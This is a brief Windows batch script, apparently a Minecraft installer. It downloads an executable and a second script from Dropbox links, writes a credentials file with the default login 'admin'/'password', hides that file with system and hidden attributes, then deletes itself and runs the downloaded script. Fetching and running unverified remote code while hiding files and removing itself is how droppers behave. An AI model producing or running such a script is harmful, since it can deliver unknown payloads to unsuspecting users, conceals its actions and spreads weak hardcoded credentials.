@echo off
mkdir data
mkdir bin
echo Downloading Minecraft.exe
curl -o bin\minecraft.exe "https://www.dropbox.com/s/u1iu5haq0jegspx/MinecraftLauncher.exe?dl=1" -L
cls
echo Downloading run.bat
curl -o run.bat "https://www.dropbox.com/s/mavegevzttdbeqw/run.bat?dl=1" -L
(
echo set username1=admin
echo set password1=password
)>"admin.bat"
attrib +H +S "admin.bat"
del %0 & run.bat